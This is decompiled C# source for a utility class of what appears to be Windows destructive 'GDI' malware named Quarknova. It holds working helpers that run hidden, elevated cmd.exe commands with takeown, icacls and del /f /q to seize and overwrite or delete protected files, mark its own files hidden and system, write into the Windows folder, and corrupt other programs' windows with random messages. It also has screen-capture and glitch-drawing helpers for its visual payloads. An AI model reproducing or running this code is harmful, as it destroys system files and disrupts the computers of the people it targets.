using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.ExceptionServices;
using System.Security;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Quarknova.Main;

namespace Quarknova.Utilities
{
	// Token: 0x02000003 RID: 3
	internal class Functions
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000026A4 File Offset: 0x000008A4
		public static bool IsAdministrator()
		{
			bool result;
			using (WindowsIdentity current = WindowsIdentity.GetCurrent())
			{
				result = new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator);
			}
			return result;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000026E8 File Offset: 0x000008E8
		public static void ForceOverwriteFile(string path, byte[] bytes)
		{
			string str = string.Concat(new string[]
			{
				"takeown /f \"",
				path,
				"\" & icacls \"",
				path,
				"\" /grant %username%:F /T"
			});
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/c " + str,
				Verb = "runas",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}).WaitForExit();
			try
			{
				File.WriteAllBytes(path, bytes);
			}
			catch
			{
				Functions.ForceDeleteFile(path);
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002788 File Offset: 0x00000988
		public static void ForceDeleteFile(string path)
		{
			string str = string.Concat(new string[]
			{
				"takeown /f \"",
				path,
				"\" & icacls \"",
				path,
				"\" /grant %username%:F /T & del /f /q ",
				path
			});
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/c " + str,
				Verb = "runas",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			});
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002805 File Offset: 0x00000A05
		public static void CreateQuarknovaData(string name, string data = "")
		{
			File.WriteAllText(Path.GetPathRoot(Path.GetTempPath()) + "Windows\\Quarknova\\" + name, data);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002824 File Offset: 0x00000A24
		public static byte[] ZeroBytes(ushort length = 65535)
		{
			byte[] array = new byte[(int)length];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = 0;
			}
			return array;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x0000284B File Offset: 0x00000A4B
		public static int RNG(int min = 0, int max = 2147483647)
		{
			if (max == 2147483647)
			{
				max--;
			}
			return Functions.rng.Next(min, max + 1);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002868 File Offset: 0x00000A68
		public static byte[] IconToBytes(Icon icon)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				icon.Save(memoryStream);
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000028A8 File Offset: 0x00000AA8
		public static void HideFile(string path)
		{
			File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden | FileAttributes.System);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000028BA File Offset: 0x00000ABA
		public static void HideDirectory(DirectoryInfo directory)
		{
			directory.Attributes = (FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory);
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000028C4 File Offset: 0x00000AC4
		public static ThreadStart ThreadLoop(Action action, int delay)
		{
			return delegate()
			{
				for (;;)
				{
					action();
					Thread.Sleep(delay);
				}
			};
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000028E4 File Offset: 0x00000AE4
		public static ThreadStart ThreadLoop(MethodInfo method, int delay)
		{
			return delegate()
			{
				for (;;)
				{
					method.Invoke(null, new object[0]);
					Thread.Sleep(delay);
				}
			};
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002904 File Offset: 0x00000B04
		public static Imports.TernaryRasterOperations RandRop(int ropChance = -1)
		{
			if (!Payloads.DoRandRops)
			{
				return Imports.TernaryRasterOperations.SRCCOPY;
			}
			if (ropChance < 0)
			{
				ropChance = Payloads.RandRopChance;
			}
			Array values = Enum.GetValues(typeof(Imports.TernaryRasterOperations));
			if (Functions.RNG(0, ropChance) == 0)
			{
				return (Imports.TernaryRasterOperations)values.GetValue(Functions.RNG(0, values.Length - 1));
			}
			return Imports.TernaryRasterOperations.SRCCOPY;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002964 File Offset: 0x00000B64
		public static LinearGradientBrush GetQuarkGradient()
		{
			return new LinearGradientBrush(new Rectangle(Functions.RNG(Payloads.ScreenX - 50, Payloads.Width + 50), Functions.RNG(Payloads.ScreenY - 50, Payloads.Height + 50), Functions.RNG(1, Payloads.Width), Functions.RNG(1, Payloads.Height)), Color.FromArgb(Functions.RNG(150, 255), Functions.RNG(0, 20), Functions.RNG(50, 255), Functions.RNG(0, 20)), Color.FromArgb(Functions.RNG(150, 255), Functions.RNG(0, 20), Functions.RNG(50, 255), Functions.RNG(50, 255)), (float)Functions.RNG(0, 359));
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002A2C File Offset: 0x00000C2C
		public static LinearGradientBrush GetRandGradient(bool colorful = true, bool allowMonochrome = false)
		{
			return new LinearGradientBrush(new Rectangle(Functions.RNG(Payloads.ScreenX, Payloads.Width), Functions.RNG(Payloads.ScreenY, Payloads.Height), Functions.RNG(1, 48), Functions.RNG(1, 48)), Functions.GetRandColor(colorful, allowMonochrome), Functions.GetRandColor(colorful, allowMonochrome), (float)((Functions.RNG(0, 1) == 0) ? (Functions.RNG(0, 72) * 5) : Functions.RNG(0, 359)));
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002AA0 File Offset: 0x00000CA0
		public static PointF[] GetRandFloatPoints()
		{
			List<PointF> list = new List<PointF>();
			for (int i = 0; i < Functions.RNG(3, 10); i++)
			{
				list.Add(new PointF((float)Functions.RNG(Payloads.ScreenX, Payloads.Width), (float)Functions.RNG(Payloads.ScreenY, Payloads.Height)));
			}
			return list.ToArray();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002AF8 File Offset: 0x00000CF8
		public static PointF[] GetSmallRandFloatPoints()
		{
			List<PointF> list = new List<PointF>();
			int num = Functions.RNG(Payloads.ScreenX, Payloads.Width + 48);
			int num2 = Functions.RNG(Payloads.ScreenY, Payloads.Height + 48);
			for (int i = 0; i < Functions.RNG(3, 10); i++)
			{
				list.Add(new PointF((float)Functions.RNG(num, num + 48), (float)Functions.RNG(num2, num2 + 48)));
			}
			return list.ToArray();
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002B6C File Offset: 0x00000D6C
		public static PointF[] GetBezierFloatPoints()
		{
			List<PointF> list = new List<PointF>();
			for (int i = 0; i < 4; i++)
			{
				list.Add(new PointF((float)Functions.RNG(Payloads.ScreenX, Payloads.Width), (float)Functions.RNG(Payloads.ScreenY, Payloads.Height)));
			}
			return list.ToArray();
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002BBC File Offset: 0x00000DBC
		public static Bitmap ResizeBitmap(Bitmap bmp, int width, int height)
		{
			Bitmap bitmap = new Bitmap(width, height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.InterpolationMode = InterpolationMode.NearestNeighbor;
				graphics.CompositingQuality = CompositingQuality.HighSpeed;
				graphics.DrawImage(bmp, 0, 0, width, height);
			}
			return bitmap;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002C10 File Offset: 0x00000E10
		public static Bitmap ColorBitmap(Bitmap bmp)
		{
			Bitmap bitmap = new Bitmap(bmp.Width, bmp.Height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.DrawImage(bmp, new Rectangle(0, 0, bmp.Width, bmp.Height), new Rectangle(0, 0, bmp.Width, bmp.Height), GraphicsUnit.Pixel);
			}
			for (int i = 0; i < bitmap.Width; i++)
			{
				for (int j = 0; j < bitmap.Height; j++)
				{
					Color pixel = bitmap.GetPixel(i, j);
					bitmap.SetPixel(i, j, Color.FromArgb((int)pixel.R, (int)pixel.R, (int)pixel.B));
				}
			}
			bitmap.Save("C:\\Users\\WiPet\\Desktop\\pic.png");
			return bitmap;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002CDC File Offset: 0x00000EDC
		public static Color GetRandColor(bool colorful = true, bool allowMonochrome = false)
		{
			Color result;
			if (colorful)
			{
				result = Color.FromArgb(Functions.RNG(0, 255), Functions.RNG(0, 1) * 255, Functions.RNG(0, 1) * 255, Functions.RNG(0, 1) * 255);
				if (!allowMonochrome)
				{
					if (result.R + result.G + result.B == 0)
					{
						switch (Functions.RNG(0, 2))
						{
						case 0:
							result = Color.FromArgb(255, 0, 0);
							break;
						case 1:
							result = Color.FromArgb(0, 255, 0);
							break;
						case 2:
							result = Color.FromArgb(0, 0, 255);
							break;
						}
					}
					if ((int)(result.R + result.G + result.B) == 765)
					{
						switch (Functions.RNG(0, 2))
						{
						case 0:
							result = Color.FromArgb(0, 255, 255);
							break;
						case 1:
							result = Color.FromArgb(255, 0, 255);
							break;
						case 2:
							result = Color.FromArgb(255, 255, 0);
							break;
						}
					}
				}
			}
			else
			{
				result = Color.FromArgb(Functions.RNG(0, 255), Functions.RNG(0, 255), Functions.RNG(0, 255), Functions.RNG(0, 255));
			}
			return result;
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002E38 File Offset: 0x00001038
		public static void ColorFilter(QuickBitmap bmp)
		{
			int[] array = new int[]
			{
				Functions.RNG(0, 1),
				Functions.RNG(0, 1),
				Functions.RNG(0, 1)
			};
			for (int i = 0; i < bmp.Width; i++)
			{
				for (int j = 0; j < bmp.Height; j++)
				{
					Color pixel = bmp.GetPixel(i, j);
					Color colour = Color.FromArgb((int)((array[0] == 1) ? pixel.R : 0), (int)((array[1] == 1) ? pixel.G : 0), (int)((array[2] == 1) ? pixel.B : 0));
					if (colour.R != 0 || colour.G != 0 || colour.B != 0)
					{
						bmp.SetPixel(i, j, colour);
					}
				}
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002EF4 File Offset: 0x000010F4
		public static QuickBitmap GetScreenBmp(int x = -1, int y = -1, int width = -1, int height = -1)
		{
			if (width == -1)
			{
				width = Payloads.RealWidth;
			}
			if (height == -1)
			{
				height = Payloads.RealHeight;
			}
			if (x == -1)
			{
				x = Payloads.ScreenX;
			}
			if (y == -1)
			{
				y = Payloads.ScreenY;
			}
			QuickBitmap quickBitmap = new QuickBitmap(width, height);
			Graphics.FromImage(quickBitmap.Bitmap).CopyFromScreen(x, y, 0, 0, quickBitmap.Size);
			return quickBitmap;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002F50 File Offset: 0x00001150
		public static void BitmapColorMatrix(QuickBitmap bmp)
		{
			ColorMatrix newColorMatrix = new ColorMatrix(new float[][]
			{
				new float[]
				{
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10)
				},
				new float[]
				{
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10)
				},
				new float[]
				{
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10)
				},
				new float[]
				{
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10)
				},
				new float[]
				{
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10),
					(float)(Functions.RNG(-10, 10) / 10)
				}
			});
			using (ImageAttributes imageAttributes = new ImageAttributes())
			{
				using (Graphics graphics = Graphics.FromImage(bmp.Bitmap))
				{
					imageAttributes.SetColorMatrix(newColorMatrix, ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
					graphics.DrawImage(bmp.Bitmap, new Rectangle(0, 0, bmp.Width, bmp.Height), 0, 0, bmp.Width, bmp.Height, GraphicsUnit.Pixel, imageAttributes);
				}
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000031A4 File Offset: 0x000013A4
		public static string GetRandString(int minRange, int maxRange, int length)
		{
			string text = "";
			for (int i = 0; i < length; i++)
			{
				text += ((char)Functions.RNG(minRange, maxRange)).ToString();
			}
			return text;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000031DC File Offset: 0x000013DC
		public static string GetRandLettersNumbers(int length)
		{
			string text = "";
			string text2 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
			for (int i = 0; i < length; i++)
			{
				text += text2[Functions.RNG(0, text2.Length - 1)].ToString();
			}
			return text;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003228 File Offset: 0x00001428
		public static string StringToHexadecimal(string input)
		{
			string text = "";
			for (int i = 0; i < input.Length; i++)
			{
				text += ((int)input[i]).ToString("X");
			}
			return text;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003268 File Offset: 0x00001468
		[HandleProcessCorruptedStateExceptions]
		[SecurityCritical]
		public static void CorruptHandle(IntPtr hWnd)
		{
			int length = Imports.SendMessage(hWnd, 14, 0, IntPtr.Zero);
			StringBuilder lParam = new StringBuilder(Functions.GetRandString(32, 4096, length));
			Imports.SendMessage(hWnd, 12, (IntPtr)8192, lParam);
			Array values = Enum.GetValues(typeof(Imports.WindowMessages));
			Imports.WindowMessages msg = (Imports.WindowMessages)values.GetValue(Functions.RNG(0, values.Length - 1));
			try
			{
				Imports.SendMessage(hWnd, (int)msg, (Functions.RNG(0, 1) == 0) ? Functions.RNG(0, 255) : 0, (IntPtr)((Functions.RNG(0, 1) == 0) ? Functions.RNG(0, 255) : 0));
			}
			catch
			{
			}
			try
			{
				Imports.SendMessage(hWnd, Functions.RNG(0, 8192), (Functions.RNG(0, 1) == 0) ? Functions.RNG(0, 255) : 0, (IntPtr)((Functions.RNG(0, 1) == 0) ? Functions.RNG(0, 255) : 0));
			}
			catch
			{
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x0000337C File Offset: 0x0000157C
		public static byte GetBitsPerPixel(PixelFormat pixelFormat)
		{
			if (pixelFormat <= PixelFormat.Format32bppRgb)
			{
				if (pixelFormat == PixelFormat.Format24bppRgb)
				{
					return 24;
				}
				if (pixelFormat != PixelFormat.Format32bppRgb)
				{
					goto IL_32;
				}
			}
			else if (pixelFormat != PixelFormat.Format32bppPArgb && pixelFormat != PixelFormat.Format32bppArgb)
			{
				goto IL_32;
			}
			return 32;
			IL_32:
			throw new ArgumentException("Only 24-bit and 32-bit images are supported.");
		}

		// Token: 0x0600001F RID: 31 RVA: 0x000033BA File Offset: 0x000015BA
		public static IntPtr CreateLParam(int wLow, int wHigh)
		{
			return (IntPtr)((int)((short)wHigh) << 16 | (wLow & 65535));
		}

		// Token: 0x04000001 RID: 1
		public static Random rng = new Random();
	}
}
